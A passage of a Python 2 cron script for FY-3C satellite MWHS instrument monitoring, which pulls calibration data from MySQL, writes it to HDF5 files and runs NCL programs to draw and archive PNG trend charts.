every 12 or 6 hours.\n\nUsage:\n    calc_draw_4sbus_mwhs.py --sat=fy3c --ins=mwhs --span=12 --date=now\n\nArguments:\n    sat: the satellite you want to calc, fy3c\n    ins: the insatrument you want to calc, mwts\n    span: hour span, 12 or 6. ONLY 12 is supported now.\n    date: draw for special date. YYYY-mm-dd-h like 2014-04-24-12 [default: now]\n        where 2014-04-24-12 means draw for launch time to today's 11:59\n\neg:\nif we are crontabed at 2013-12-06 14:00, we should draw for previous time zone \n(14:00-12) = 02:00, that is: launch time to today's 11:59's data.\n\"\"\"\n\n__author__ = 'gumeng'\n\n# Copyright (c) 2014, shinetek.\n# All rights reserved.\n#    \n# work flow:\n# crontabed every 12 or 6 hours, then\n#      check ps result, kill previous same program, avoiding hang.\n#      get time span\n#      get obc table list\n#      export all life obc data to hdf\n#      draw png\n#      mv png to dest path\n#         \n# /usr/bin/python /home/fymonitor/MONITORFY3C/py2/bin/calc_draw_obc.py \n# --sat=fy3c --ins=mwts --nwp=t639 --date=now\n# >> /home/fymonitor/DATA/LOG/calc_draw_obc.py.log 2>&1 &\n#                         \n# date          author    changes\n# 2014-05-19    gumeng    update\n# 2014-04-28    gumeng    create\n\nimport os\nimport sys\nimport time\nimport numpy\nimport signal\nimport commands\nimport warnings\nimport MySQLdb\nimport h5py as h5\nimport shutil\n#import datetime\n#from datetime import *\nfrom datetime import datetime\nfrom datetime import timedelta\nfrom multiprocessing import Pool\nfrom multiprocessing.dummy import Pool as ThreadPool \n\nwarnings.filterwarnings('ignore', category = MySQLdb.Warning)\n\ntimeuse_begin = time.time()\n\nsys.path.append('/home/fymonitor/MONITORFY3C/py2/conf')\nconf = __import__('conf')\ncommon = __import__('common')\ndocopt = __import__('docopt')\n\n# set read-only global variables.\n\narguments = docopt.docopt(__doc__)\nsat = arguments['--sat'].lower()\nins = arguments['--ins'].lower()\nhour_span = arguments['--span'].lower()\norig_calc_date = arguments['--date'].lower()\ncalc_date = orig_calc_date\n\nins_conf_file = sat.upper() + '_' + ins.upper() + '_CONF'\nins_conf = __import__(ins_conf_file)\n\nif sat not in conf.support_sat_ins or ins not in conf.support_sat_ins[sat]:\n    print 'sat or ins setting is NOT found in conf.py'\n    sys.exit(0)\n    \npid = os.getpid()\nfname = os.path.splitext(os.path.basename(os.path.realpath(__file__) ) )[0]\nlog_tag = fname + '.' + sat + '.' + ins + '.' + str(pid)\nmy_name = common.get_local_hostname()\nmy_tag = my_name+'.'+log_tag\nmy_pidfile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.pid'\nmy_alivefile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.alive'\nmy_log = conf.log_path + '/' + my_name + '.' # just prefix: /log/path/prefix.\n\n#get the correct time span.\nif calc_date == 'now':\n    calc_date = common.utc_YmdH()\ntimespan = common.get_calc_timespan(calc_date, hour_span)\ntimespan['begin_t'] = 0 # the min time stamp before launch.\ntime_tag = timespan['begin_str'] + '`' + timespan['end_str'] + '`'\n\n# mysql tables we should draw\nmy_Calc_channel_table = []\nmy_channel_table = []\nmy_obc_table = []\nmy_Calc_table = []\n\nCalc_table_3day = []\nCalc_table_1month =[]\n\nobc_table_3day = []\nobc_table_1month = []\n\nchannel_table_3day = []\nchannel_table_1month = []\n\nCalc_channel_table_3day = []\nCalc_channel_table_1month = []\n\n# Deal with signal.\ndef signal_handler(signum, frame):\n    msg = 'FAILED`recv signal ' + str(signum) + '. exit now.'\n    common.info(my_log, log_tag, time_tag + msg)\n\n    if os.path.isfile(my_pidfile):\n        os.remove(my_pidfile)\n    \n    sys.exit(0)\n\n# create hdf by obc setting\ndef create_obc_hdf(name_tage,hfile,numpy_data, obc_setting):\n\n    try:\n        previous_idx = 0 # time idx = 0\n        for one_setting in obc_setting:\n            start_idx = previous_idx + 1\n            for one_column in xrange(1, one_setting['columns'] + 1):\n                if one_setting['columns'] == 1:\n                    ds_name = one_setting['db_field'] + '_' + name_tage\n                else:\n                    ds_name = one_setting['db_field'] + str(one_column) + '_'+ name_tage\n\n                idx = start_idx + one_column - 1\n                #factor = int(one_setting['factor'])\n                #print one_setting['factor'] \n                factor =one_setting['factor']         \n                \n#                 if 'float' in one_setting['hdf_dtype'] \\\n#                     and 'int' in one_setting['db_dtype']:\n#                     hfile.create_dataset(ds_name, data = \\\n#                             numpy_data[:, idx].astype(numpy.float32)*1/factor)\n                if 'float' in one_setting['hdf_dtype'] \\\n                    and 'int' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                    \n                elif 'tinyint' in one_setting['hdf_dtype'] \\\n                    and 'tinyint' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                elif 'int' in one_setting['hdf_dtype'] \\\n                    and 'int' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.int32)*1/factor).astype(numpy.float32))\n                elif 'float' in one_setting['hdf_dtype'] \\\n                    and 'float' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                elif 'float' in one_setting['hdf_dtype'] \\\n                    and 'smallint unsigned' in one_setting['db_dtype']:\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                \n                else:\n                    #pass\n                    hfile.create_dataset(ds_name, data = \\\n                            (numpy_data[:, idx].astype(numpy.float32)*1/factor).astype(numpy.float32))\n                \n                previous_idx += 1\n    except:\n        return False\n    \n    return True\n\ndef draw_one_channel(channel):\n    if len(channel_table_3day) <= 0:\n        return True\n    if len(channel_table_1month) <= 0:\n        return True\n    if len(Calc_channel_table_3day) <= 0:\n        return True\n    if len(Calc_channel_table_1month) <= 0:\n        return True\n    \n    tmpfile3day = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d') + '.3day'\n    sql_3day = common.get_obc_3dim_sql(ins_conf.obc_3dim_to_db.values(),str(channel),\n                                  channel_table_3day, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile3day + '.txt')\n    begin_sql_3day = conf.obc_select_prefix_sql + ' 1 from ' + channel_table_3day[0] \\\n                + conf.obc_3dim_where_sql + str(channel) + \" limit 1\"\n                \n    tmpfile1month = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d')+ '.1month' \n    sql_1month = common.get_obc_3dim_sql(ins_conf.obc_3dim_to_db.values(),str(channel),\n                                  channel_table_1month, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile1month + '.txt')\n        \n        \n    tmpfile3day_calc = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d') + '.3day_calc'\n    sql_3day_calc = common.get_obc_3dim_sql(ins_conf.calc_3dim_to_db.values(),str(channel),\n                                  Calc_channel_table_3day, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile3day_calc + '.txt')\n    \n                \n    tmpfile1month_calc = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() \\\n            + '.ch' + format(channel, '02d')+ '.1month_calc' \n    sql_1month_calc = common.get_obc_3dim_sql(ins_conf.calc_3dim_to_db.values(),str(channel),\n                                  Calc_channel_table_1month, conf.obc_select_prefix_sql,\n                                  conf.obc_3dim_where_sql) \\\n        + conf.export_txt%(tmpfile1month_calc + '.txt')    \n        \n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])      \n        cur.execute(sql_3day)\n        cur.execute(sql_1month)\n        #print Calc_channel_table_3day\n        #print \"-------------------------------------\"\n        #print sql_1month_calc\n        cur.execute(sql_3day_calc)\n        cur.execute(sql_1month_calc)\n        cur.execute(begin_sql_3day)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'draw obc 3-dim ch' + str(channel) + ' png`Mysql Fatal Error[' \\\n            + str(e.args[0]) + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n\n    tmpfile1year = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() + '.CH' + format(channel, '02d') +'.1year' + '.obc'\n    tmpfilelife = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() + '.CH' + format(channel, '02d') +'.life' + '.obc'\n\n    get_channel_txt(tmpfile1year,tmpfilelife,'cal_coef1',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'cal_coef2',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'cal_coef3',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'gain',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'agc',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'SPBB1',channel)\n    get_channel_txt(tmpfile1year,tmpfilelife,'SPBB2',channel)\n\n    \n    \n    tmphdf = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS()+ '.CH' +format(channel, '02d')+'.HDF'\n    print tmphdf\n    # trans txt result to numpy fmt, to easy hdf create.\n    data_3day = numpy.loadtxt(tmpfile3day + '.txt', dtype='str', delimiter=',')\n    data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n    \n    data_3day_calc = numpy.loadtxt(tmpfile3day_calc + '.txt', dtype='str', delimiter=',')\n    data_1month_calc = numpy.loadtxt(tmpfile1month_calc + '.txt', dtype='str', delimiter=',')\n    \n\n    hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1month[:, 0]) )\n    hfile.create_dataset(\"time_1month\", data = ymdh_arr.astype(numpy.int32))\n    \n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n    hfile.create_dataset(\"time_1month_calc\", data = ymdh_arr.astype(numpy.int32))\n     \n    ret = create_obc_hdf('1month',hfile,data_1month, ins_conf.obc_3dim_to_db.values())\n    ret = create_obc_hdf('1month',hfile,data_1month_calc, ins_conf.calc_3dim_to_db.values())\n    if not ret:\n        return False\n    \n    ymdh_arr = numpy.array(map(common.time_to_arr, data_3day[:, 0]) )\n    hfile.create_dataset(\"time_3day\", data = ymdh_arr.astype(numpy.int32)) \n    \n    ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n    hfile.create_dataset(\"time_3day_calc\", data = ymdh_arr.astype(numpy.int32))\n        \n    ret = create_obc_hdf('3day',hfile,data_3day, ins_conf.obc_3dim_to_db.values())\n    ret = create_obc_hdf('3day',hfile,data_3day_calc, ins_conf.calc_3dim_to_db.values())\n    if not ret:\n        return False\n    \n    #hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    #ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n    #hfile.create_dataset(\"time_1month_channel_calc\", data = ymdh_arr.astype(numpy.int32)) \n    #ret = create_obc_hdf('1month',hfile,data_1month_calc, ins_conf.calc_3dim_to_db.values())\n    #if not ret:\n    #    return False\n    \n    #ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n    #hfile.create_dataset(\"time_3day_channel_calc\", data = ymdh_arr.astype(numpy.int32))     \n    #ret = create_obc_hdf('3day',hfile,data_3day_calc, ins_conf.calc_3dim_to_db.values())\n    #if not ret:\n    #    return False\n\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'cal_coef1',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'cal_coef2',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'cal_coef3',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'gain',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'agc',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'SPBB1',hfile)\n    create_1year_hdf_channel(tmpfile1year,tmpfilelife,'SPBB2',hfile)\n    \n\n    hfile.close()\n    \n    #return \n    \n\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_CH01_[PRT|INS_TEMP|...]\n    png_title = sat.upper() + '_' + ins.upper() + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%Y%m%d\") + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%H%M\") + '_TO_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d') \\\n                + '_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%H%M') \\\n                + '_' \\\n                + format(int(hour_span), '02d') + 'H_CH' \\\n                + format(channel,'02d')\n    \n    ret = draw_channel(tmphdf, format(channel,'02d'), png_title,begin_data[0]['ymdhms'].strftime(\"%Y%m%d\"),\\\n                       datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d'))\n    \n    return True\n\ndef draw_channel(tmphdf, channel, png_title, begin_time, end_time):\n    cmd = []\n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_channel'])\n    for i in xrange(0, sds_len): \n        file_out = \"/home/fymonitor/MONITORFY3C/py2/plot/\" + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png']\n        ncl_name = \"/home/fymonitor/MONITORFY3C/py2/plot/\" + sat.upper() + '_' + ins.upper()+'_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '_4SUB.ncl'\n        temp_log = conf.tmp_path + '/monitor.' + log_tag + '.ch' + channel+'.' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] +'.log'\n        temp_cmd = conf.ncl + \" 'sat=\\\"\" + sat.upper() + \"\\\"' \" \\\n            + \"'instrument=\\\"\" + ins.upper() + \"\\\"' channel=\" + str(channel) \\\n            + \" 'file_in=\\\"\" + tmphdf + \"\\\"' \" \\\n            + \" 'file_out=\\\"\" + file_out + \"\\\"' \" \\\n            + \" 'file_title=\\\"\" + png_title + '_' +conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + \"\\\"' \" +  ncl_name \\\n            + ' > ' + temp_log + ' 2>&1'\n        print temp_cmd\n        \n        cmd.append(temp_cmd)\n\n    #print cmd\n\n    #use map:16.6s ; not use map:44.52s\n    timeuse_begin = time.time()\n    \n    for cmd_temp in cmd:\n        print cmd_temp\n        (status, output) = commands.getstatusoutput(cmd_temp)\n        common.debug(my_log, log_tag, str(status) + '`' + cmd_temp + '`' + output)\n    \n#     pooltest = ThreadPool()\n#     ret = pooltest.map(commands.getstatusoutput, cmd )\n#     pooltest.close()\n#     pooltest.join()\n\n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print timeuse\n    \n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_channel'])\n    for i in xrange(0, sds_len): \n        file_out = \"/home/fymonitor/MONITORFY3C/py2/plot/\" + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png']\n        temp_log = conf.tmp_path + '/monitor.' + log_tag + '.ch' + channel+'.' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] +'.log'\n        # check png.OK\n        if not common.check_file_exist(file_out + '.png', check_ok = True):\n            msg = 'ncl program error: output png file not exist.' + file_out\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n        dest_path = '/hds/assimilation/fymonitor/DATA/IMG/NSMC' + '/' + sat.upper() + '/' + ins.upper() + '/' \\\n                  + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['dir_name'] + '/' \n        arch_path = dest_path + str(end_time[0:4]) + '/'\n        latest_path = dest_path + 'LATEST/' + str(channel) + '/'\n        \n        try:\n            shutil.copyfile(file_out + '.png', arch_path + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '.png')\n            common.empty_folder(latest_path)\n            common.mv_file(file_out + '.png', latest_path + png_title + '_' + conf.draw_ncl_new[ins]['ncl_prog_channel'][i]['tmp_png'] + '.png')\n            os.remove(file_out + '.png.OK')\n            os.remove(temp_log)\n        except:\n            msg = 'png created, but cp or mv to dest error'\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n    try:\n        os.remove(tmphdf)\n    except OSError,e:\n        msg = 'clean tmp file error[' + str(e.args[0])+']: ' + e.args[1] \n        print msg             \n        common.warn(my_log, log_tag, time_tag + msg)\n\n    return True\n\ndef get_channel_txt(tmpfile1year,tmpfilelife,type,channel):\n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()\n    #yes_time = now_time + datetime.timedelta(days=(-365))\n    yes_time = now_time + timedelta(days=(-365))\n    last_year = yes_time.strftime('%Y-%m-%d %H:%M:%S')\n\n    #select * from FY3C_MWTS_DAILY order by ymdh desc limit 365;\n    sql_1year = 'select * from FY3C_MWHS_DAILY_15 where type = \\''+type + \\\n                '\\'' + ' and channel = ' + str(channel) +' and ymdh > ' + '\\'' +last_year + '\\'' + \\\n                conf.export_txt%(tmpfile1year +'.' +type + '.txt')\n\n    sql_life = 'select * from FY3C_MWHS_DAILY_15 where type = \\''+type + \\\n                '\\''  + ' and channel = ' + str(channel)\\\n                + conf.export_txt%(tmpfilelife +'.' +type + '.txt')\n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.db_setting['stat_db'])      \n        cur.execute(sql_1year)\n        cur.execute(sql_life)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'export channel date `Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n\n\n\n\n#2014-08-08 00:00:00\ndef get_obc_txt(tmpfile1year,tmpfilelife,type):\n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()\n    #yes_time = now_time + datetime.timedelta(days=(-365))\n    yes_time = now_time + timedelta(days=(-365))\n    last_year = yes_time.strftime('%Y-%m-%d %H:%M:%S')\n    \n    \n    #select * from FY3C_MWTS_DAILY order by ymdh desc limit 365;\n    sql_1year = 'select * from FY3C_MWHS_DAILY where type = \\''+type + \\\n                '\\'' + ' and ymdh > ' + '\\'' +last_year + '\\'' + \\\n                conf.export_txt%(tmpfile1year +'.' +type + '.txt')\n    sql_life = 'select * from FY3C_MWHS_DAILY where type = \\''+type + '\\''\\\n                + conf.export_txt%(tmpfilelife +'.' +type + '.txt')\n                \n    #print sql_1year\n    #print \"----------\"\n    #print sql_life\n\n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.db_setting['stat_db'])      \n        cur.execute(sql_1year)\n        cur.execute(sql_life)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'qqqdraw obc 2-dim png`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n    \ndef create_1year_hdf(tmpfile1year,tmpfilelife,type,hfile):\n    data_1year = numpy.loadtxt(tmpfile1year +'.' +type + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1year[:, 0]) )\n    hfile.create_dataset(type+\"_time_1year\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_1year\",data=data_1year[: ,3].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_1year\",data=data_1year[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_1year\",data=data_1year[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_1year\",data=data_1year[: ,6].astype(numpy.float32)) \n    \n    \n    data_life = numpy.loadtxt(tmpfilelife +'.' +type + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_life[:, 0]) )\n    hfile.create_dataset(type+\"_time_life\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_life\",data=data_life[: ,3].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_life\",data=data_life[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_life\",data=data_life[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_life\",data=data_life[: ,6].astype(numpy.float32)) \n      \n    return True\n    \n\ndef create_1year_hdf_channel(tmpfile1year,tmpfilelife,type,hfile):\n    data_1year = numpy.loadtxt(tmpfile1year +'.' +type + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1year[:, 0]) )\n    hfile.create_dataset(type+\"_time_1year\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_1year\",data=data_1year[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_1year\",data=data_1year[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_1year\",data=data_1year[: ,6].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_1year\",data=data_1year[: ,7].astype(numpy.float32)) \n    \n    \n    data_life = numpy.loadtxt(tmpfilelife +'.' +type + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_life[:, 0]) )\n    hfile.create_dataset(type+\"_time_life\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_life\",data=data_life[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_life\",data=data_life[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_life\",data=data_life[: ,6].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_life\",data=data_life[: ,7].astype(numpy.float32)) \n      \n    return True\n     \n\ndef draw_just_obc():\n    if len(obc_table_3day) <= 0:\n        return True\n    if len(obc_table_1month) <= 0:\n        return True\n    if len(Calc_table_3day) <= 0:\n        return True\n    if len(Calc_table_1month) <= 0:\n        return True\n    \n    tmpfile3day = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.3day' +'.obc'\n    sql_3day = common.get_obc_2dim_sql(ins_conf.obc_to_db.values(),ins_conf.channels,\n                                  obc_table_3day, conf.obc_select_prefix_sql) \\\n        + conf.export_txt%(tmpfile3day + '.txt')\n    begin_sql_3day = conf.obc_select_prefix_sql + ' 1 from ' + obc_table_3day[0] \\\n                + \" limit 1\"   \n    \n    tmpfile1month = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.1month' +'.obc'\n    sql_1month = common.get_obc_2dim_sql(ins_conf.obc_to_db.values(),ins_conf.channels,\n                                  obc_table_1month, conf.obc_select_prefix_sql) \\\n        + conf.export_txt%(tmpfile1month + '.txt')\n        \n\n\n    tmpfile3day_calc = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.3day.calc' +'.obc'\n    sql_3day_calc = common.get_obc_2dim_sql(ins_conf.calc_to_db.values(),ins_conf.channels,\n                                  Calc_table_3day, conf.obc_select_prefix_sql) \\\n         + conf.export_txt%(tmpfile3day_calc + '.txt')  \n      \n    tmpfile1month_calc = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.1month.calc' +'.obc'\n    sql_1month_calc = common.get_obc_2dim_sql(ins_conf.calc_to_db.values(),ins_conf.channels,\n                                  Calc_table_1month, conf.obc_select_prefix_sql) \\\n         + conf.export_txt%(tmpfile1month_calc + '.txt')\n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])      \n        cur.execute(sql_3day)\n        cur.execute(sql_1month)\n        cur.execute(sql_3day_calc)\n        cur.execute(sql_1month_calc)\n        cur.execute(begin_sql_3day)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        #print sql_3day\n        #print \"------------------\"\n        #print sql_1month\n        #print \"------------------\"\n        #print sql_3day_calc\n        #print \"------------------\"\n        #print sql_1month_calc\n        #print \"------------------\"\n        #print begin_sql_3day\n        #print \"------------------\"\n        msg = '??draw obc 2-dim png`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n    \n \n    tmpfile1year = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.1year' + '.obc'\n    tmpfilelife = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.life' + '.obc'\n\n    \n    sds_len = len(ins_conf.sds_name)\n    for i in xrange(1, sds_len+1):\n        get_obc_txt(tmpfile1year,tmpfilelife,ins_conf.sds_name[i]['name'])\n\n#     \n#     get_obc_txt(tmpfile1year,tmpfilelife,'cold_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'hot_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'earth_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'scan_prd')\n    \n\n    \n    tmphdf = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS()+'.OBC.HDF'\n    print tmphdf\n    # trans txt result to numpy fmt, to easy hdf create.\n    data_3day = numpy.loadtxt(tmpfile3day + '.txt', dtype='str', delimiter=',')\n    data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n    \n    data_3day_calc = numpy.loadtxt(tmpfile3day_calc + '.txt', dtype='str', delimiter=',')\n    data_1month_calc = numpy.loadtxt(tmpfile1month_calc + '.txt', dtype='str', delimiter=',')\n\n    hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1month[:, 0]) )\n    hfile.create_dataset(\"time_1month\", data = ymdh_arr.astype(numpy.int32)) \n    ret = create_obc_hdf('1month',hfile,data_1month, ins_conf.obc_to_db.values())\n\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_3day[:, 0]) )\n    hfile.create_dataset(\"time_3day\", data = ymdh_arr.astype(numpy.int32))     \n    ret = create_obc_hdf('3day',hfile,data_3day, ins_conf.obc_to_db.values())\n    \n    \n    ret = create_obc_hdf('1month',hfile,data_1month_calc, ins_conf.calc_to_db.values())\n\n      \n    ret = create_obc_hdf('3day',hfile,data_3day_calc, ins_conf.calc_to_db.values())\n    if not ret:\n        return False\n\n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n#     hfile.create_dataset(\"time_1month_calc\", data = ymdh_arr.astype(numpy.int32))\n#     #hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1]*0.001.astype(numpy.int32))\n#     hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_1month_calc',data=data_1month_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_1month_calc',data=data_1month_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_1month_calc',data=data_1month_calc[: ,4].astype(numpy.float32))\n#     #ret = create_obc_hdf('1month_calc',hfile,data_1month, ins_conf.calc_to_db.values())\n# \n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n#     hfile.create_dataset(\"time_3day_calc\", data = ymdh_arr.astype(numpy.int32)) \n#     hfile.create_dataset('cold_ang_minus_3day_calc',data=data_3day_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_3day_calc',data=data_3day_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_3day_calc',data=data_3day_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_3day_calc',data=data_3day_calc[: ,4].astype(numpy.float32))\n#         \n#     #ret = create_obc_hdf('3day_calc',hfile,data_3day, ins_conf.calc_to_db.values())\n\n    \n   \n    \n    \n    sds_len = len(ins_conf.sds_name)\n   